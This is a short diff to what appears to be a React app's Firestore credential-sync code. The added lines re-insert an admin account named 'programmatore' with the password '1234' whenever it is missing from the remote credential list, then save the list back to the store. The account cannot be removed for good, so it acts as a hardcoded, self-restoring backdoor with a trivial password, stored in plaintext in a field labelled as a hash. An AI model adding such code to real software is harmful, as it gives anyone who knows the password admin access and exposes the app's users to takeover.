@@ -204,6 +204,11 @@ export default function App() {
 
     const unsubscribeCredentials = firestoreSync.subscribeCredentials((remoteCreds, remoteUpdatedAt) => {
       if (remoteCreds && Array.isArray(remoteCreds)) {
+        const hasProgrammatore = remoteCreds.some(c => c.username === "programmatore");
+        if (!hasProgrammatore) {
+          remoteCreds.push({ username: "programmatore", role: "admin", passwordHash: "1234", mustChange: true });
+          firestoreSync.saveCredentials(remoteCreds);
+        }
         if (remoteUpdatedAt && remoteUpdatedAt <= credentialsUpdatedAtRef.current) {
           return;
         }
